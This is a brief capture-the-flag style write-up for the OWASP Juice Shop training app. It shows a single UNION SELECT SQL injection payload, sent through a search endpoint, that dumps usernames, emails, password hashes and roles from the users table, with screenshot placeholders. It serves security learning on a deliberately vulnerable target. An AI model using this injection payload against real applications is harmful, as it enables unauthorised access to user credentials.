# User Credentials

`https://pwning.owasp-juice.shop/companion-guide/latest/part1/running.html`

Same case as `Database Schema`, we attack from a search endpoint.

![alt text](assets/usercred1.png)

![alt text](assets/usercred2.png)

We can use a UNION SELECT attack to extract data from the users table.

```sql
apple'))+UNION+SELECT+id,username,email,password,role,profileImage,isActive,lastLoginIp,deletedAt+FROM+users+--
```

![alt text](assets/usercred3.png)

![alt text](assets/usercred4.png)